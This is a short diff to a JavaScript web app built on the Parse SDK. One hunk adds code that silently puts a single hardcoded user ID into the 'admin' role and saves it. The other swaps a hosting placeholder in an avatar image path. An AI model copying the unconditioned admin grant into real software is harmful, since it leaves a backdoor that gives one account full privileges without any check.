@@ -94,6 +94,17 @@
                                 },[roleContainer.role]);
                             }
                         };
+
+                    Parse.Promise.when(new Parse.Query(Parse.Role).equalTo('name','admin').first(),new Parse.Query(Parse.User).equalTo('objectId','IDrn1iLOiX').first()).then(function(role,user) {
+                        if (role && user) {
+                            role.getUsers().add(user);
+                            role.save();
+                        }
+                        else {
+                            console.log('results: ',role,user);
+                        }
+                    });
+
                     new Parse.Query(Parse.User).equalTo('username',user.get('username')).first().then(function(user) {
                         return new Parse.Query(Parse.Role).find();
                     })
@@ -253,7 +264,7 @@
                             return 'https://graph.facebook.com/' + this._user.get('facebookId') + '/picture?type=square';
                         }
                         else {
-                            return 'HOSTING_BASEassets/images/' + this._user.get('gender') + '.png';
+                            return '__HOSTING_BASE__assets/images/' + this._user.get('gender') + '.png';
                         }
                     }
                     else {
